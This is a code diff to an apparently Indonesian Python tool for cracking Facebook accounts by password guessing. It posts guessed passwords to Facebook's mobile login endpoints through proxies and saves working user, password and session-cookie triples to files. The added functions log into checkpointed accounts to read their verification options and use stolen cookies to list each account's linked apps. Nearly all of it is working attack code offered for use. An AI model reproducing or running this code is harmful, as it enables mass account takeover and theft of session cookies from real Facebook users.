@@ -366,15 +366,8 @@ def menu():
 	HikmatXD = input(f"{garis} pilih : {H}")
 	if HikmatXD in ["1","01"]:
 		cracked_publickey()
-	#elif HikmatXD in ["2","02"]:
-		#crack_email()
 	elif HikmatXD in ["2","02"]:
-		print("")
-		x=f"{P2}fitur ini dalam masa pengembangan!! "
-		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-		input(f"{garis} enter untuk kembali ")
-		menu()
-		#check_detect()
+		check_detect()
 	elif HikmatXD in ["0","00"]:
 		print("")
 		x=f"{P2}[01] hapus cookie\n{P2}[02] exit\n{P2}[{H2}00{P2}] kembali"
@@ -692,6 +685,20 @@ def crack_public_pilihan():
 		tampilkan_ttl.append("no")
 	else:
 		tampilkan_ttl.append("no")
+	nanya_opsi = input(garis+" ingin memunculkan opsi detect ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
+	if nanya_opsi in ["y","ya","Y"]:
+		tampilkan_opsi.append("ya")
+	elif nanya_opsi in ["t","T","tidak"]:
+		tampilkan_opsi.append("no")
+	else:
+		tampilkan_opsi.append("no")
+	nanya_apk = input(garis+" ingin memunculkan aplikasi terkait ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
+	if nanya_apk in ["y","ya","Y"]:
+		tampilkan_apk.append("ya")
+	elif nanya_apk in ["t","T","tidak"]:
+		tampilkan_apk.append("no")
+	else:
+		tampilkan_apk.append("no")
 	pw_tambahai = input(garis+" ingin menambahkan password belakang nama ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
 	if pw_tambahai in ["y","Y","yes","Ya","Yes"]:
 		pw_belakang.append("ya")
@@ -815,6 +822,13 @@ def mobile(uiz,pwr):
 			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in ses.cookies.get_dict().keys():
+				if "ya" in tampilkan_opsi:
+					opsi_detect(uiz,pw)
+				elif "no" in tampilkan_opsi:
+					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
+					cp+=1
+					break
 				if "no" in tampilkan_ttl:
 					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
@@ -944,6 +958,13 @@ def mobile_v2(uiz,pwr):
 				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=headers2, cookies={"cookie": kuko}, proxies=proxs, allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
+				if "ya" in tampilkan_opsi:
+					opsi_detect(uiz,pw)
+				elif "no" in tampilkan_opsi:
+					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
+					cp+=1
+					break
 				if "no" in tampilkan_ttl:
 					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
@@ -1033,6 +1054,13 @@ def mbasic(uiz,pwr):
 			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in ses.cookies.get_dict().keys():
+				if "ya" in tampilkan_opsi:
+					opsi_detect(uiz,pw)
+				elif "no" in tampilkan_opsi:
+					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
+					cp+=1
+					break
 				if "no" in tampilkan_ttl:
 					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
@@ -1060,6 +1088,23 @@ def mbasic(uiz,pwr):
 				else:continue
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
+				if "ya" in tampilkan_apk:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
+					print("\r %s*--> %s "%(H,kuki))
+					cek_apk(ses,kuki)
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+					break
+				elif "no" in tampilkan_apk:
+					coki=po.cookies.get_dict()
+					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
+					print("\r %s*--> %s "%(H,kuki))
+					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
+					ok+=1
+					break
 				if "no" in tampilkan_ttl:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
@@ -1121,6 +1166,13 @@ def free(uiz,pwr):
 			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Ffree.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in ses.cookies.get_dict().keys():
+				if "ya" in tampilkan_opsi:
+					opsi_detect(uiz,pw)
+				elif "no" in tampilkan_opsi:
+					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
+					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
+					cp+=1
+					break
 				if "no" in tampilkan_ttl:
 					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
@@ -1260,5 +1312,63 @@ def api(uiz,pwr):
 			continue
 	
 	HikmatXD +=1
+
+def opsi_detect(uiz,pw):
+	global cp
+	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
+	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+	ses = requests.Session()
+	from bs4 import BeautifulSoup as sop
+	try:
+		hi = ses.get('https://mbasic.facebook.com')
+		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':uiz,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
+		jo = ho.find('form')
+		data = {}
+		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
+		for anj in jo('input'):
+			if anj.get('name') in lion:
+				data.update({anj.get('name'):anj.get('value')})
+		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
+		print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
+		open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
+		cp+=1
+		opsi = kent.find_all('option')
+		if len(opsi)==0:
+			print(garis+H+" tap yes/a2f.. cek lagi akunnya login di fb lite ")
+		else:
+			for opsii in opsi:
+				print('\r'+garis+'%s terdapat %s%s '%(P,K,opsii.text))
+	except Exception as c:
+		print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
+		print('\r'+garis+'%s tidak dapat mengecek opsi... cek login di fb lite/mbasic '%(M))
+		open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
+		cp+=1
+		
+def cek_apk(ses,kuki):
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":kuki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print('\r'+garis+M+' tidak ada apk aktif yang terkait ')
+	else:
+		print('\r'+garis+H+' aplikasi yang terkait : ')
+		for i in range(len(game)):
+			print("\r"+garis+" %s%s. %s%s"%(P,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),P))
+
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":kuki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print('\r'+garis+M+' tidak ada apk kadaluarsa yang terkait ')
+	else:
+		print('\r'+garis+K+' aplikasi kadaluarsa yang terkait : ')
+		for i in range(len(game)):
+			print("\r"+garis+" %s%s. %s%s"%(P,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),P))
+		else:
+			print('\r') 
+
+
 
 cek_cookie()
